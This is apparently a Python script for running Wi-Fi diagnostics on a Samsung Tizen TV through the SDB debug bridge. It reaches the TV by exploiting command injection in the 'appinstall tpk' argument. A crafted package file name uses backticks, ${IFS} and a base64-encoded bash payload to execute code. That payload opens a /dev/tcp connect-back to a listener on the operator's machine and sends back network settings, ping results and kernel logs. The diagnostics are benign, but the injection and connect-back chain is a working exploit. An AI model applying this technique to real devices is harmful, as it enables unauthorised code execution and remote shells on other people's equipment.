import base64
from pathlib import Path
import socket
import subprocess
import time
import uuid

TV_HOST = "192.168.0.14"
SERIAL = f"{TV_HOST}:26101"
SDB = str(Path(__file__).resolve().parent / ".local/tizen-sdk/tools/sdb.exe")

def run_sdb(*args, timeout=15):
    cmd = [SDB, *args]
    res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return res.stdout + res.stderr

print("Ensuring SDB connection...")
connect_out = run_sdb("connect", SERIAL)
print("Connect output:", connect_out.strip())

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    s.connect((TV_HOST, 9))
    local_ip = s.getsockname()[0]

print(f"Local IP route: {local_ip}")

diag_sh = """#!/bin/bash
echo "=== WIFI VCONF CONFIGURATION ==="
for k in db/wifi/ssid db/wifi/bssid db/wifi/frequency db/wifi/channel db/wifi/rssi db/wifi/ip db/wifi/state db/network/default_iface db/menu/network/type db/network/ip db/network/gateway db/network/dns1 db/network/dns2; do
    echo -n "$k = "
    vconftool get "$k" 2>/dev/null || echo "<none>"
done

echo "=== PING ROUTER GATEWAY 192.168.0.1 ==="
ping -c 3 -W 2 192.168.0.1 2>&1

echo "=== PING INTERNET 8.8.8.8 ==="
ping -c 3 -W 2 8.8.8.8 2>&1

echo "=== PING SAMSUNG OSB SERVER ==="
ping -c 3 -W 2 osb.samsungcloudsolution.net 2>&1 || true

echo "=== NETWORK INTERFACES STATUS ==="
cat /proc/net/dev
cat /proc/net/wireless 2>/dev/null || true

echo "=== RECENT SYSTEM / WLAN DMESG LOGS ==="
dmesg | tail -n 80

echo "=== DIAGNOSTICS END ==="
"""

token = uuid.uuid4().hex[:10]
local_script_path = Path(__file__).resolve().parent / f".local/diag-{token}.sh"
local_script_path.write_text(diag_sh, newline="\n")

remote_script = f"/home/owner/share/tmp/sdk_tools/diag-{token}.sh"
push_out = run_sdb("-s", SERIAL, "push", str(local_script_path), remote_script)
print("Push output:", push_out.strip())

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((local_ip, 0))
    listener.listen(1)
    listener.settimeout(20)
    port = listener.getsockname()[1]
    print(f"Listening on {local_ip}:{port}...")

    command = f"exec 3<>/dev/tcp/{local_ip}/{port};cat {remote_script}|bash >&3 2>&3;exec 3>&-"
    script = f"/bin/mkdir /tmp/d-{token} 2>/dev/null&&{{ {command};}}"
    encoded = base64.b64encode(script.encode()).decode()
    name = f"new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"
    arg = f"0 appinstall tpk {name}"

    proc = subprocess.Popen([SDB, "-s", SERIAL, "shell", arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        conn, peer = listener.accept()
        print(f"Connected from TV: {peer}")
        chunks = []
        with conn:
            conn.settimeout(15)
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                chunks.append(data)
        output = b"".join(chunks).decode(errors="replace")
        print(output)
        (Path(__file__).resolve().parent / "wifi_deep_diag.txt").write_text(output, encoding="utf-8")
    except socket.timeout:
        print("Timed out.")
        stdout, stderr = proc.communicate(timeout=5)
        print("STDOUT:", stdout)
        print("STDERR:", stderr)
    finally:
        if proc.poll() is None:
            proc.terminate()
        local_script_path.unlink(missing_ok=True)
